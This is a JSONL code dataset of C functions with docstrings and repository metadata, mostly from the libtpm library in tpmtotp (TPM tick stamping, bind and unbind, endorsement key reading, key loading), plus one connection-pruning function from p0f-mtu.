keyhandle_no,\n\t\t                                 TPM_HASH_SIZE, antireplay,\n\t\t                                   TPM_HASH_SIZE, digestToStamp,\n\t\t                                     TSS_Session_GetHandle(&sess),\n\t\t                                       TPM_NONCE_SIZE,nonceodd,\n\t\t                                         c,\n\t\t                                           TPM_HASH_SIZE,authdata);\n\n\t\tif ((ret & ERR_MASK)) {\n\t\t\treturn ret;\n\t\t}\n\n\t\tret = TPM_Transmit(&tpmdata,\"TickStampBlob - AUTH1\");\n\t\t\n\t\tTSS_SessionClose(&sess);\n\n\t\tif (0 != ret) {\n\t\t\treturn ret;\n\t\t}\n\n\t\tret  = tpm_buffer_load32(&tpmdata, \n\t\t                         TPM_DATA_OFFSET + TPM_CURRENT_TICKS_SIZE,\n\t\t                         &size);\n\t\tif ((ret & ERR_MASK)) {\n\t\t\treturn ret;\n\t\t}\n\n\t\tret = TSS_checkhmac1(&tpmdata,ordinal_no,nonceodd,TSS_Session_GetAuth(&sess),TPM_HASH_SIZE,\n\t\t                     TPM_CURRENT_TICKS_SIZE+TPM_U32_SIZE+size, TPM_DATA_OFFSET,\n\t\t                     0,0);\n\t\tif (0 != ret) {\n\t\t\treturn ret;\n\t\t}\n\n\t\tif (NULL != tickbuff) {\n\t\t\tmemcpy(tickbuff, \n\t\t\t       &tpmdata.buffer[TPM_DATA_OFFSET], \n\t\t\t       TPM_CURRENT_TICKS_SIZE);\n\t\t}\n\t\tif (NULL != signature) {\n\t\t\tret = tpm_buffer_load32(&tpmdata, \n\t\t\t                        TPM_DATA_OFFSET+TPM_CURRENT_TICKS_SIZE,\n\t\t\t                        &len);\n\t\t\tif ((ret & ERR_MASK)) {\n\t\t\t\treturn ret;\n\t\t\t}\n\t\t\tSET_TPM_BUFFER(signature,\n\t\t\t               &tpmdata.buffer[TPM_DATA_OFFSET+TPM_CURRENT_TICKS_SIZE+TPM_U32_SIZE],\n\t\t\t               len);\n\t\t}\n\n\t} else {\n\t\tret = TSS_buildbuff(\"00 c1 T l l % %\",&tpmdata,\n\t\t                             ordinal_no,\n\t\t                               keyhandle_no,\n\t\t                                 TPM_HASH_SIZE, antireplay,\n\t\t                                   TPM_HASH_SIZE, digestToStamp);\n\t\tif ((ret & ERR_MASK)) {\n\t\t\treturn ret;\n\t\t}\n\n\t\tret = TPM_Transmit(&tpmdata, \"TickStampBlob\" );\n\t\t\n\t\tif (0 != ret) {\n\t\t\treturn ret;\n\t\t}\n\t\t\n\t\tif (NULL != tickbuff) {\n\t\t\tmemcpy(tickbuff, \n\t\t\t       &tpmdata.buffer[TPM_DATA_OFFSET], \n\t\t\t       TPM_CURRENT_TICKS_SIZE);\n\t\t}\n\t\tif (NULL != signature) {\n\t\t\tret = tpm_buffer_load32(&tpmdata, \n\t\t\t                        TPM_DATA_OFFSET+TPM_CURRENT_TICKS_SIZE,\n\t\t\t                        &len);\n\t\t\tif ((ret & ERR_MASK)) {\n\t\t\t\treturn ret;\n\t\t\t}\n\t\t\tSET_TPM_BUFFER(signature,\n\t\t\t               &tpmdata.buffer[TPM_DATA_OFFSET+TPM_CURRENT_TICKS_SIZE+TPM_U32_SIZE],\n\t\t\t               len);\n\t\t}\n\t}\n\treturn ret;\n}", "path": "libtpm\\ticks.c", "repo_name": "mjg59/tpmtotp", "stars": 191, "license": "gpl-2.0", "language": "c", "size": 269}
{"docstring": "/*                                                                          */\n/* The arguments are...                                                     */\n/*                                                                          */\n/* key       is a pointer to a OpenSSL RSA public key                       */\n/* data      is a pointer to the data to be bound                           */\n/* datalen   is the length of the data to be bound   (max 256)              */\n/* blob      is a pointer to an area to receive the bound data              */\n/* bloblen   is a pointer to an integer which will receive the length       */\n/*           of the bound data                                              */\n/*                                                                          */\n/****************************************************************************/\n", "func_signal": "uint32_t TSS_Bind(RSA *key,\n                  const struct tpm_buffer *data,\n                  struct tpm_buffer *blob)", "code": "{\n\tuint32_t ret;\n\tunsigned char * blob2 = NULL;\n\tint size = RSA_size(key);\n\tunsigned char tcpa[] = \"TCPA\";\n\t\n\tblob2 = malloc(size);\n\tif (NULL == blob2) {\n\t\treturn ERR_MEM_ERR;\n\t}\n\t/* check input arguments */\n\tif (key == NULL || data == NULL || blob == NULL) \n\t\treturn ERR_NULL_ARG;\n\n\tret = RSA_padding_add_PKCS1_OAEP(blob2,size,data->buffer,data->used,tcpa,4);\n\tif (ret != 1) {\n\t\t free(blob2);\n\t\t return ERR_CRYPT_ERR;\n\t}\n\tret = RSA_public_encrypt(size,blob2,blob->buffer,key,RSA_NO_PADDING);\n\tfree(blob2);\n\tif ((int)ret == -1) \n\t\t return ERR_CRYPT_ERR;\n\tblob->used = ret;\n\treturn 0;\n}", "path": "libtpm\\bind.c", "repo_name": "mjg59/tpmtotp", "stars": 191, "license": "gpl-2.0", "language": "c", "size": 269}
{"docstring": "/****************************************************************************/\n/*                                                                          */\n/* Calculate the size of a Public Key Blob                                  */\n/*                                                                          */\n/****************************************************************************/\n", "func_signal": "int TSS_PubKeySize(const struct tpm_buffer *tb, unsigned int offset, int pcrpresent)", "code": "{\n\tuint32_t parmsize;\n\tuint32_t pcrisize;\n\tuint32_t keylength;\n\tconst unsigned char *keybuff = tb->buffer;\n\tuint32_t offset_in = offset;\n   \n\toffset += TPM_U32_SIZE + TPM_U16_SIZE + TPM_U16_SIZE;\n\tif (offset + 4 >= tb->used) {\n\t\treturn ERR_STRUCTURE;\n\t}\n\tparmsize = LOAD32(keybuff,offset);\n\toffset += TPM_U32_SIZE;\n\toffset += parmsize;\n\tif (pcrpresent) {\n\t\tif (offset + 4 >= tb->used) {\n\t\t\treturn ERR_STRUCTURE;\n\t\t}\n\t\tpcrisize  = LOAD32(keybuff,offset);\n\t\toffset += TPM_U32_SIZE;\n\t\toffset += pcrisize;\n\t}\n\tif (offset + 4 >= tb->used) {\n\t\treturn ERR_STRUCTURE;\n\t}\n\tkeylength = LOAD32(keybuff,offset);\n\toffset += TPM_U32_SIZE;\n\toffset += keylength;\n\tif (offset > tb->used) {\n\t\treturn ERR_STRUCTURE;\n\t}\n\treturn (offset - offset_in);\n}", "path": "libtpm\\keys.c", "repo_name": "mjg59/tpmtotp", "stars": 191, "license": "gpl-2.0", "language": "c", "size": 269}
{"docstring": "/****************************************************************************/\n/*                                                                          */\n/*                                                                          */\n/* The arguments are...                                                     */\n/*                                                                          */\n/*                                                                          */\n", "func_signal": "uint32_t TPM_GetTicks(unsigned char * tickbuffer)", "code": "{\n\tuint32_t ret;\n\tuint32_t ordinal_no = htonl(TPM_ORD_GetTicks);\n\tSTACK_TPM_BUFFER(tpmdata)\n\t\n\tret = TSS_buildbuff(\"00 c1 T l\",&tpmdata,\n\t                             ordinal_no);\n\tif ((ret & ERR_MASK)) {\n\t\treturn ret;\n\t}\n\t\n\tret = TPM_Transmit(&tpmdata,\"GetTicks\");\n\t\n\tif (0 != ret)\n\t\treturn ret;\n\t\t\n\tmemcpy(tickbuffer, \n\t       &tpmdata.buffer[TPM_DATA_OFFSET], \n\t       sizeof(TPM_CURRENT_TICKS)-2*TPM_U32_SIZE);\n\t\n\treturn ret;\n}", "path": "libtpm\\ticks.c", "repo_name": "mjg59/tpmtotp", "stars": 191, "license": "gpl-2.0", "language": "c", "size": 269}
{"docstring": "/****************************************************************************/\n/*                                                                          */\n/* Owner Read the TPM Endorsement Key                                       */\n/*                                                                          */\n/****************************************************************************/\n", "func_signal": "uint32_t TPM_OwnerReadPubek(unsigned char *ownauth,pubkeydata *k)", "code": "{\n   uint32_t ret;\n   STACK_TPM_BUFFER(tpmdata)\n   unsigned char nonceodd[TPM_NONCE_SIZE];\n   unsigned char authdata[TPM_NONCE_SIZE];\n   unsigned char c = 0;\n   uint32_t ordinal = htonl(0x7D);\n   uint32_t len;\n   int size;\n   session sess;\n\n   /* generate odd nonce */\n   TSS_gennonce(nonceodd);\n   /* Open OIAP Session */\n   ret = TSS_SessionOpen(SESSION_DSAP|SESSION_OSAP|SESSION_OIAP,\n                         &sess,\n                         ownauth, TPM_ET_OWNER, 0);\n   if (ret != 0) return ret;\n\n   /* calculate authorization HMAC value */\n   ret = TSS_authhmac(authdata,TSS_Session_GetAuth(&sess),TPM_HASH_SIZE,TSS_Session_GetENonce(&sess),nonceodd,c,\n                      TPM_U32_SIZE,&ordinal,\n                      0,0);\n   if ((ret & ERR_MASK))\n      {\n      TSS_SessionClose(&sess);\n      return ret;\n      }\n   /* build the request buffer */\n   ret = TSS_buildbuff(\"00 c2 T l L % o %\",&tpmdata,\n                   ordinal,\n                   TSS_Session_GetHandle(&sess),\n                   TPM_NONCE_SIZE,nonceodd,\n                   c,\n                   TPM_HASH_SIZE,authdata);\n   if ((ret & ERR_MASK) != 0)\n      {\n      TSS_SessionClose(&sess);\n      return ret;\n      }\n   /* transmit the request buffer to the TPM device and read the reply */\n   ret = TPM_Transmit(&tpmdata,\"OwnerReadEkey\");\n   TSS_SessionClose(&sess);\n   if (ret != 0)\n      {\n      return ret;\n      }\n   size = TSS_PubKeySize(&tpmdata, TPM_DATA_OFFSET, 0);\n   ret = TSS_checkhmac1(&tpmdata,ordinal,nonceodd,TSS_Session_GetAuth(&sess),TPM_HASH_SIZE,\n                        size,TPM_DATA_OFFSET,\n                        0,0);\n   if (ret != 0) return ret;\n   len = TSS_PubKeyExtract(&tpmdata, TPM_DATA_OFFSET, k);\n   if ((len & ERR_MASK)) \n       return len;\n   return 0;\n   }\n\n/****************************************************************************/\n/*                                                                          */\n/* Disable Reading of the Public Endorsement Key                            */\n/*                                                                          */\n/****************************************************************************/\nuint32_t TPM_DisablePubekRead(unsigned char *ownauth)\n   {\n   uint32_t ret;\n   STACK_TPM_BUFFER(tpmdata)\n   unsigned char nonceodd[TPM_NONCE_SIZE];\n   unsigned char authdata[TPM_NONCE_SIZE];\n   unsigned char c = 0;\n   uint32_t ordinal = htonl(TPM_ORD_DisablePubekRead);\n   session sess;\n\n   /* generate odd nonce */\n   TSS_gennonce(nonceodd);\n   /* Open OIAP Session */\n   ret = TSS_SessionOpen(SESSION_DSAP | SESSION_OSAP|SESSION_OIAP,\n                         &sess,\n                         ownauth, TPM_ET_OWNER, 0);\n   if (ret != 0) return ret;\n   /* move Network byte order data to variables for hmac calculation */\n   /* calculate authorization HMAC value */\n   ret = TSS_authhmac(authdata,TSS_Session_GetAuth(&sess),TPM_HASH_SIZE,TSS_Session_GetENonce(&sess),nonceodd,c,\n                      TPM_U32_SIZE,&ordinal,\n                      0,0);\n   if ((ret & ERR_MASK))\n      {\n      TSS_SessionClose(&sess);\n      return ret;\n      }\n   /* build the request buffer */\n   ret = TSS_buildbuff(\"00 c2 T l L % o %\",&tpmdata,\n                   ordinal,\n                   TSS_Session_GetHandle(&sess),\n                   TPM_NONCE_SIZE,nonceodd,\n                   c,\n                   TPM_HASH_SIZE,authdata);\n   if ((ret & ERR_MASK) != 0)\n      {\n      TSS_SessionClose(&sess);\n      return ret;\n      }\n   /* transmit the request buffer to the TPM device and read the reply */\n   ret = TPM_Transmit(&tpmdata,\"DisablePubekRead\");\n   TSS_SessionClose(&sess);\n   if (ret != 0)\n      {\n      return ret;\n      }\n   ret = TSS_checkhmac1(&tpmdata,ordinal,nonceodd,TSS_Session_GetAuth(&sess),TPM_HASH_SIZE,\n                        0,0);\n   if (ret != 0) return ret;\n   return 0;\n   }\n\n/****************************************************************************/\n/*                                                                          */\n/* Return the public portion of the EK or SRK                               */\n/*                                                                          */\n/* The arguments are...                                                     */\n/*                                                                          */\n/* keyhandle is the handle of the parent key of the new key                 */\n/*           which may only be PUBEK or 0x40000000 for the SRK              */\n/* ownauth   The sha'ed owner password of the TPM                           */\n/* pubkeybuf is a pointer to an area that will hold the public portion of   */\n/*           the requested key                                              */\n/* pubkeybuflen gives the size of the buffer pubkeybuf on input and will    */\n/*              return the size of the public key part on output.           */\n/*                                                                          */\n/****************************************************************************/\nuint32_t TPM_OwnerReadInternalPub(uint32_t keyhandle,\n                                  unsigned char * ownerauth,\n                                  pubkeydata *k)\n{\n\tSTACK_TPM_BUFFER(tpmdata)\n\tunsigned char nonceodd[TPM_NONCE_SIZE];\n\tunsigned char authdata[TPM_NONCE_SIZE];\n  \tunsigned char c = 0;\n\tuint32_t ordinal_no   = htonl(TPM_ORD_OwnerReadInternalPub);\n\tuint32_t keyhandle_no = htonl(keyhandle);\n\tuint32_t ret;\n\tuint32_t keylen;\n\tsession sess;\n\n\t/* generate odd nonce */\n\tret  = TSS_gennonce(nonceodd);\n\tif (0 == ret) return ERR_CRYPT_ERR;\n\t\n\t/* Open OIAP Session */\n\tret = TSS_SessionOpen(SESSION_DSAP|SESSION_OSAP|SESSION_OIAP,\n\t                      &sess,\n\t                      ownerauth, TPM_ET_OWNER, 0);\n\tif (ret != 0) return ret;\n\n\tret = TSS_authhmac(authdata,TSS_Session_GetAuth(&sess),TPM_HASH_SIZE,TSS_Session_GetENonce(&sess),nonceodd,c,\n\t                   TPM_U32_SIZE, &ordinal_no,\n\t                   TPM_U32_SIZE, &keyhandle_no,\n\t                   0,0);\n\tif (0 != ret) {\n\t\tTSS_SessionClose(&sess);\n\t\treturn ret;\n\t}\n\n\t/* build the request buffer */\n\tret = TSS_buildbuff(\"00 c2 T l l L % o %\", &tpmdata,\n\t                             ordinal_no,\n\t                               keyhandle_no,\n\t                                 TSS_Session_GetHandle(&sess),\n\t                                   TPM_NONCE_SIZE,nonceodd,\n\t                                     c,\n\t                                       TPM_HASH_SIZE,authdata);\n\tif ((ret & ERR_MASK) != 0) {\n\t\tTSS_SessionClose(&sess);\n\t\treturn ret;\n\t}\n\tret = TPM_Transmit(&tpmdata,\"OwnerReadInternalPub\");\n\tTSS_SessionClose(&sess);\n\tif (0 != ret) {\n\t\treturn ret;\n\t}\n\t\n\tkeylen = TSS_PubKeySize(&tpmdata, TPM_DATA_OFFSET, 0);\n\tif ((keylen & ERR_MASK)) {\n\t\treturn keylen;\n\t}\n\n\tret = TSS_checkhmac1(&tpmdata,ordinal_no,nonceodd,TSS_Session_GetAuth(&sess),TPM_HASH_SIZE,\n\t                     keylen, TPM_DATA_OFFSET,\n\t                     0,0);\n\n\tif (0 != ret) {\n\t\treturn ret;\n\t}\n\t\n\tkeylen = TSS_PubKeyExtract(&tpmdata, TPM_DATA_OFFSET, k);\n\tif ((keylen & ERR_MASK)) {\n\t\tret = keylen;\n\t}\n\n\treturn ret;\n}", "path": "libtpm\\keys.c", "repo_name": "mjg59/tpmtotp", "stars": 191, "license": "gpl-2.0", "language": "c", "size": 269}
{"docstring": "/*                                                                          */\n/* keyhandle is the handle of parent key for the new key                    */\n/*           0x40000000 for the SRK                                         */\n/* keyauth   is the authorization data (password) for the parent key        */\n/*           if null, it is assumed that the parent requires no auth        */\n/* keyparms  is a pointer to a keydata structure with all data  for the new */\n/*           key                                                            */\n/* newhandle is a pointer to a 32bit word which will receive the handle     */\n/*           of the new key                                                 */\n/*                                                                          */\n/****************************************************************************/\n", "func_signal": "uint32_t TPM_LoadKey(uint32_t keyhandle, unsigned char *keyauth,\n                keydata *keyparms,uint32_t *newhandle)", "code": "{\n   uint32_t ret;\n   STACK_TPM_BUFFER(tpmdata)\n   STACK_TPM_BUFFER(kparmbuf)\n   unsigned char nonceodd[TPM_NONCE_SIZE];\n   unsigned char pubauth[TPM_HASH_SIZE];\n   unsigned char c = 0;\n   uint32_t ordinal = htonl(TPM_ORD_LoadKey);\n   uint32_t keyhndl;\n   int      kparmbufsize;\n\n   ret = needKeysRoom(keyhandle, 0, 0, 0);\n   if (ret != 0) {\n      return ret;\n   }\n\n   /* check input arguments */\n   if (keyparms == NULL || newhandle == NULL) return ERR_NULL_ARG;\n   if (keyauth != NULL) /* parent requires authorization */\n      {\n      session sess;\n      /* generate odd nonce */\n      TSS_gennonce(nonceodd);\n      /* Open OIAP Session */\n      ret = TSS_SessionOpen(SESSION_OSAP|SESSION_OIAP|SESSION_DSAP,\n                            &sess,\n                            keyauth, TPM_ET_KEYHANDLE, keyhandle);\n      if (ret != 0) return ret;\n      /* move Network byte order data to variables for hmac calculation */\n      keyhndl = htonl(keyhandle);\n\n      /* convert keyparm structure to buffer */\n      ret = TPM_WriteKey(&kparmbuf,keyparms);\n      if ((ret & ERR_MASK) != 0)\n         {\n         TSS_SessionClose(&sess);\n         return ret;\n         }\n      kparmbufsize = ret;\n      /* calculate authorization HMAC value */\n      ret = TSS_authhmac(pubauth,TSS_Session_GetAuth(&sess),TPM_HASH_SIZE,TSS_Session_GetENonce(&sess),nonceodd,c,\n                         TPM_U32_SIZE,&ordinal,\n                         kparmbufsize,kparmbuf.buffer,\n                         0,0);\n      if ((ret & ERR_MASK))\n         {\n         TSS_SessionClose(&sess);\n         return ret;\n         }\n      /* build the request buffer */\n      ret = TSS_buildbuff(\"00 c2 T l l % L % o %\",&tpmdata,\n                      ordinal,\n                      keyhndl,\n                      kparmbufsize,kparmbuf.buffer,\n                      TSS_Session_GetHandle(&sess),\n                      TPM_NONCE_SIZE,nonceodd,\n                      c,\n                      TPM_HASH_SIZE,pubauth);\n      if ((ret & ERR_MASK) != 0)\n         {\n         TSS_SessionClose(&sess);\n         return ret;\n         }\n      /* transmit the request buffer to the TPM device and read the reply */\n      ret = TPM_Transmit(&tpmdata,\"LoadKey - AUTH1\");\n      TSS_SessionClose(&sess);\n      if (ret != 0)\n         {\n         return ret;\n         }\n      ret = TSS_checkhmac1(&tpmdata,ordinal,nonceodd,TSS_Session_GetAuth(&sess),TPM_HASH_SIZE,\n                           TPM_U32_SIZE,TPM_DATA_OFFSET,\n                           0,0);\n      if (ret != 0) return ret;\n      ret = tpm_buffer_load32(&tpmdata,TPM_DATA_OFFSET, newhandle);\n      if ((ret & ERR_MASK)) {\n          return ret;\n      }\n      }\n   else /* parent requires NO authorization */\n      {\n      /* move Network byte order data to variables for hmac calculation */\n      keyhndl = htonl(keyhandle);\n      /* convert keyparm structure to buffer */\n      ret = TPM_WriteKey(&kparmbuf,keyparms);\n      if ((ret & ERR_MASK) != 0) return ret;\n      kparmbufsize = ret;\n      /* build the request buffer */\n      ret = TSS_buildbuff(\"00 c1 T l l %\",&tpmdata,\n                      ordinal,\n                      keyhndl,\n                      kparmbufsize,kparmbuf.buffer);\n      if ((ret & ERR_MASK) != 0) return ret;\n      /* transmit the request buffer to the TPM device and read the reply */\n      ret = TPM_Transmit(&tpmdata,\"LoadKey\");\n      if (ret != 0) return ret;\n      ret = tpm_buffer_load32(&tpmdata,TPM_DATA_OFFSET,newhandle);\n      if ((ret & ERR_MASK)) {\n          return ret;\n      }\n      }\n   return 0;\n   }\n\n/****************************************************************************/\n/*                                                                          */\n/* Load a new Key into the TPM                                              */\n/*                                                                          */\n/* The arguments are...                                                     */\n/*                                                                          */\n/* keyhandle is the handle of parent key for the new key                    */\n/*           0x40000000 for the SRK                                         */\n/* keyauth   is the authorization data (password) for the parent key        */\n/*           if null, it is assumed that the parent requires no auth        */\n/* keyparms  is a pointer to a keydata structure with all data  for the new */\n/*           key                                                            */\n/* newhandle is a pointer to a 32bit word which will receive the handle     */\n/*           of the new key                                                 */\n/*                                                                          */\n/****************************************************************************/\nuint32_t TPM_LoadKey2(uint32_t keyhandle, unsigned char *keyauth,\n                      keydata *keyparms, uint32_t *newhandle)\n{\n\tuint32_t ret;\n\tSTACK_TPM_BUFFER(tpmdata)\n\tSTACK_TPM_BUFFER(kparmbuf)\n\tunsigned char nonceodd[TPM_NONCE_SIZE];\n\tunsigned char pubauth[TPM_HASH_SIZE];\n\tunsigned char c = 0;\n\tuint32_t ordinal = htonl(TPM_ORD_LoadKey2);\n\tuint32_t keyhndl = htonl(keyhandle);\n\tint      kparmbufsize;\n\n\t/* check input arguments */\n\tif (keyparms == NULL || newhandle == NULL) \n\t\treturn ERR_NULL_ARG;\n\t\t\n\tret = needKeysRoom(keyhandle, 0, 0, 0);\n\tif (ret != 0) {\n\t\treturn ret;\n\t}\n\n\tif (keyauth != NULL) /* parent requires authorization */ {\n\t\tsession sess;\n\t\t/* generate odd nonce */\n\t\tTSS_gennonce(nonceodd);\n\t\t/* Open OIAP Session */\n\t\tret = TSS_SessionOpen(SESSION_OSAP|SESSION_OIAP|SESSION_DSAP,\n\t\t                      &sess,\n\t\t                      keyauth, TPM_ET_KEYHANDLE, keyhandle);\n\t\tif (ret != 0) \n\t\t\treturn ret;\n\t\t/* move Network byte order data to variables for hmac calculation */\n\n\t\t/* convert keyparm structure to buffer */\n\t\tret = TPM_WriteKey(&kparmbuf,keyparms);\n\t\tif ((ret & ERR_MASK) != 0) {\n\t\t\tTSS_SessionClose(&sess);\n\t\t\treturn ret;\n\t\t}\n\t\tkparmbufsize = ret;\n\t\t/* calculate authorization HMAC value */\n\t\tret = TSS_authhmac(pubauth,TSS_Session_GetAuth(&sess),TPM_HASH_SIZE,TSS_Session_GetENonce(&sess),nonceodd,c,\n\t\t                   TPM_U32_SIZE,&ordinal,\n\t\t                   kparmbufsize,kparmbuf.buffer,\n\t\t                   0,0);\n\t\tif ((ret & ERR_MASK)) {\n\t\t\tTSS_SessionClose(&sess);\n\t\t\treturn ret;\n\t\t}\n\t\t/* build the request buffer */\n\t\tret = TSS_buildbuff(\"00 c2 T l l % L % o %\",&tpmdata,\n\t\t                             ordinal,\n\t\t                               keyhndl,\n\t\t                                 kparmbufsize,kparmbuf.buffer,\n\t\t                                   TSS_Session_GetHandle(&sess),\n\t\t                                     TPM_NONCE_SIZE,nonceodd,\n\t\t                                       c,\n\t\t                                         TPM_HASH_SIZE,pubauth);\n\t\tif ((ret & ERR_MASK) != 0) {\n\t\t\tTSS_SessionClose(&sess);\n\t\t\treturn ret;\n\t\t}\n\t\t/* transmit the request buffer to the TPM device and read the reply */\n\t\tret = TPM_Transmit(&tpmdata,\"LoadKey2 - AUTH1\");\n\t\tTSS_SessionClose(&sess);\n\t\tif (ret != 0) {\n\t\t\treturn ret;\n\t\t}\n\t\tret = TSS_checkhmac1(&tpmdata,ordinal,nonceodd,TSS_Session_GetAuth(&sess),TPM_HASH_SIZE,\n\t\t                     0,0);\n\t\tif (ret != 0) \n\t\t\treturn ret;\n\t\tret = tpm_buffer_load32(&tpmdata,TPM_DATA_OFFSET,newhandle);\n\t\tif ((ret & ERR_MASK)) {\n\t\t\treturn ret;\n\t\t}\n\t} else /* parent requires NO authorization */ {\n\t\t/* convert keyparm structure to buffer */\n\t\tret = TPM_WriteKey(&kparmbuf,keyparms);\n\t\tif ((ret & ERR_MASK) != 0) \n\t\t\treturn ret;\n\t\tkparmbufsize = ret;\n\t\t/* build the request buffer */\n\t\tret = TSS_buildbuff(\"00 c1 T l l %\",&tpmdata,\n\t\t                             ordinal,\n\t\t                               keyhndl,\n\t\t                                 kparmbufsize,kparmbuf.buffer);\n\t\tif ((ret & ERR_MASK) != 0) \n\t\t\treturn ret;\n\t\t/* transmit the request buffer to the TPM device and read the reply */\n\t\tret = TPM_Transmit(&tpmdata,\"LoadKey2\");\n\t\tif (ret != 0) \n\t\t\treturn ret;\n\t\tret = tpm_buffer_load32(&tpmdata,TPM_DATA_OFFSET,newhandle);\n\t\tif ((ret & ERR_MASK)) {\n\t\t\treturn ret;\n\t\t}\n\t}\n\treturn ret;\n}", "path": "libtpm\\keys.c", "repo_name": "mjg59/tpmtotp", "stars": 191, "license": "gpl-2.0", "language": "c", "size": 269}
{"docstring": "/*           0x40000000 for the SRK                                         */\n/* keyauth   is the authorization data (password) for the key               */\n/*           if NULL, it is assumed that the key needs no authorization     */\n/* data      is a pointer to the data to be unbound                         */\n/* datalen   is the length of the data to be unbound (max 256?)             */\n/* blob      is a pointer to an area to received the unbound data           */\n/* bloblen   is a pointer to an integer which will receive the length       */\n/*           of the unbound data                                            */\n/*                                                                          */\n/****************************************************************************/\n", "func_signal": "uint32_t TPM_UnBind(uint32_t keyhandle,\n                    unsigned char *keyauth,\n                    unsigned char *data, uint32_t datalen,\n                    unsigned char *blob, uint32_t *bloblen)", "code": "{\n\tuint32_t ret = 0;\n\tSTACK_TPM_BUFFER(tpmdata)\n\tsession sess;\n\tunsigned char pubauth[TPM_HASH_SIZE];\n\tunsigned char nonceodd[TPM_NONCE_SIZE];\n\tunsigned char c = 0;\n\tuint32_t ordinal = htonl(TPM_ORD_UnBind);\n\tuint32_t datsize = htonl(datalen);\n\tuint32_t keyhndl = htonl(keyhandle);\n\tuint16_t keytype;\n\tuint32_t infosize;\n\n\t/* check input arguments */\n\tif (data == NULL || blob == NULL) return ERR_NULL_ARG;\n\tif (keyhandle == 0x40000000) keytype = TPM_ET_SRK;\n\telse                         keytype = TPM_ET_KEYHANDLE;\n\t\n\tret = needKeysRoom(keyhandle, 0 , 0, 0);\n\tif (ret != 0) {\n\t\treturn ret;\n\t}\n\t\n\tif (keyauth != NULL)  /* key needs authorization */ {\n\t\t/* Open OSAP Session */\n\t\tret = TSS_SessionOpen(SESSION_OSAP|SESSION_DSAP,&sess,keyauth,keytype,keyhandle);\n\t\tif (ret != 0) {\n\t\t\treturn ret;\n\t\t}\n\t\t/* generate odd nonce */\n\t\tTSS_gennonce(nonceodd);\n\t\t/* move Network byte order data to variables for HMAC calculation */\n\t\t/* calculate authorization HMAC value */\n\t\tret = TSS_authhmac(pubauth,TSS_Session_GetAuth(&sess),TPM_HASH_SIZE,TSS_Session_GetENonce(&sess),nonceodd,c,\n\t\t                   TPM_U32_SIZE,&ordinal,\n\t\t                   TPM_U32_SIZE,&datsize,\n\t\t                   datalen,data,0,0);\n\t\tif (ret != 0) {\n\t\t\tTSS_SessionClose(&sess);\n\t\t\treturn ret;\n\t\t}\n\t\t/* build the request buffer */\n\t\tret = TSS_buildbuff(\"00 C2 T l l @ L % o %\",&tpmdata,\n\t\t                             ordinal,\n\t\t                               keyhndl,\n\t\t                                 datalen,data,\n\t\t                                   TSS_Session_GetHandle(&sess),\n\t\t                                     TPM_NONCE_SIZE,nonceodd,\n\t\t                                       c,\n\t\t                                         TPM_HASH_SIZE,pubauth);\n\t\tif ((ret & ERR_MASK) != 0) {\n\t\t\tTSS_SessionClose(&sess);\n\t\t\treturn ret;\n\t\t}\n\t\t/* transmit the request buffer to the TPM device and read the reply */\n\t\tret = TPM_Transmit(&tpmdata,\"UnBind\");\n\t\tTSS_SessionClose(&sess);\n\n\t\tif (ret != 0) {\n\t\t\treturn ret;\n\t\t}\n\t\t/* calculate the size of the returned Blob */\n\t\tret = tpm_buffer_load32(&tpmdata,TPM_DATA_OFFSET, &infosize);\n\t\tif ((ret & ERR_MASK)) {\n\t\t\treturn ret;\n\t\t}\n\t\t/* check the HMAC in the response */\n\t\tret = TSS_checkhmac1(&tpmdata,ordinal,nonceodd,TSS_Session_GetAuth(&sess),TPM_HASH_SIZE,\n\t\t                     TPM_U32_SIZE,TPM_DATA_OFFSET,\n\t\t                     infosize,TPM_DATA_OFFSET + TPM_U32_SIZE,\n\t\t                     0,0);\n\t\tif (ret != 0) {\n\t\t\treturn ret;\n\t\t}\n\t\t/* copy the returned blob to caller */\n\t\tmemcpy(blob,\n\t\t       &tpmdata.buffer[TPM_DATA_OFFSET+TPM_U32_SIZE],\n\t\t       infosize);\n\t\t*bloblen = infosize;\n\t} else { /* key needs NO authorization */\n\t\t/* move Network byte order data to variables for HMAC calculation */\n\n\t\t/* build the request buffer */\n\t\tret = TSS_buildbuff(\"00 C1 T l l @\",&tpmdata,\n\t\t                             ordinal,\n\t\t                               keyhndl,\n\t\t                                 datalen,data);\n\t\tif ((ret & ERR_MASK) != 0) \n\t\t\treturn ret;\n\t\t/* transmit the request buffer to the TPM device and read the reply */\n\t\tret = TPM_Transmit(&tpmdata,\"UnBind\");\n\t\tif (ret != 0) \n\t\t\treturn ret;\n\t\t/* calculate the size of the returned Blob */\n\t\tret = tpm_buffer_load32(&tpmdata,TPM_DATA_OFFSET,&infosize);\n\t\tif ((ret & ERR_MASK)) {\n\t\t\treturn ret;\n\t\t}\n\t\t/* copy the returned blob to caller */\n\t\tmemcpy(blob,\n\t\t       &tpmdata.buffer[TPM_DATA_OFFSET+TPM_U32_SIZE],\n\t\t       infosize);\n\t\t*bloblen = infosize;\n\t}\n\treturn ret;\n}", "path": "libtpm\\bind.c", "repo_name": "mjg59/tpmtotp", "stars": 191, "license": "gpl-2.0", "language": "c", "size": 269}
{"docstring": "/* Indiscriminately kill some of the oldest flows. */\n", "func_signal": "static void nuke_flows(u8 silent)", "code": "{\n\n  u32 kcnt = 1 + (flow_cnt * KILL_PERCENT / 100);\n\n  if (silent)\n    DEBUG(\"[#] Pruning connections - trying to delete %u...\\n\",kcnt);\n  else if (!read_file)\n    WARN(\"Too many tracked connections, deleting %u. \"\n         \"Use -m to adjust.\", kcnt);\n\n  while (kcnt-- && flow_by_age) destroy_flow(flow_by_age);\n\n}", "path": "process.c", "repo_name": "ValdikSS/p0f-mtu", "stars": 213, "license": "None", "language": "c", "size": 112}
